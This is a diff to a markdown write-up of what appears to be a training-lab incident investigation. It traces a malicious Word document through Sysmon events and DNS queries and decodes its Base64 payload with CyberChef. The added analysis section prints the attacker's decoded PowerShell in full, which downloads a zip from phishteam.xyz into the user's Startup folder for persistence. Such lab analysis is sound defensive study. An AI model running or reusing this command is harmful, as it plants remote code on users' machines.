@@ -32,7 +32,7 @@ builds our understanding of the incident.
 
 ---
 
-## 🚪 Initial Access — Malicious Document
+## 🚪 Initial Access — Malicious Document & Stage 2 Execution
 
 The alert gives us a few pieces of information: the malicious 
 `.doc` file and the chain of commands executed by that document.
@@ -49,7 +49,7 @@ The room gives us some clues to start the investigation:
 WinWord.exe, we discover the malicious `.doc`, its PID, and the 
 username.
 
-WinWord.exe is the **parent process** of `free_magicules.doc`,
+WinWord.exe is the **parent process** of `free_magicules.doc` — 
 that's how I identify the malicious document. I can also filter 
 with **Event ID 11 (File Create)** for correlation.
 
@@ -64,7 +64,7 @@ with **Event ID 22 (DNS query)** and PID 496.
 <img width="600" alt="DNS query" src="https://github.com/user-attachments/assets/963ecc34-934c-47ea-9ea8-92ef3feb35e5" />
 
 I got the IP. Now I continue the investigation with PID 496 as 
-ParentProcessId to find what happened next and I discovered 
+ParentProcessId to find what happened next  and I discovered 
 the payload.
 
 <img width="750" alt="Payload discovery" src="https://github.com/user-attachments/assets/588c8dcf-facc-4f11-86f9-50cfbc91a01b" />
@@ -72,3 +72,39 @@ the payload.
 I used **CyberChef** to decode the Base64 payload.
 
 <img width="700" alt="CyberChef Base64 decode" src="https://github.com/user-attachments/assets/e7b11011-33f7-4280-8a49-1b74c4f41012" />
+
+With all of this information, I can answer every question in the 
+first part of the investigation.
+
+<img width="700" alt="First part answers" src="https://github.com/user-attachments/assets/95d740f3-ebd9-4e14-beee-7eac1ea5fdc7" />
+
+---
+
+### 🔬 Payload Analysis
+
+Let's continue through the initial access phase. It's interesting 
+to work around the payload, after decoding it, we understand 
+exactly what the attacker wants to achieve.
+
+```powershell
+$app=[Environment]::GetFolderPath('ApplicationData');
+cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; 
+iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; 
+Expand-Archive .\update.zip -DestinationPath .; 
+rm update.zip;
+```
+
+**Breakdown of the payload:**
+
+1. **Get AppData path** → resolves the user's AppData folder 
+2. **Navigate to Startup folder** → `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
+3. **Download payload** → `iwr` (Invoke-WebRequest) fetches `update.zip` from `phishteam.xyz`
+4. **Extract archive** → unzips directly into the Startup folder
+5. **Clean up** → deletes the ZIP to reduce forensic traces
+
+> 💡 This is a classic **Startup folder persistence** technique (MITRE ATT&CK T1547.001). 
+
+
+
+
+
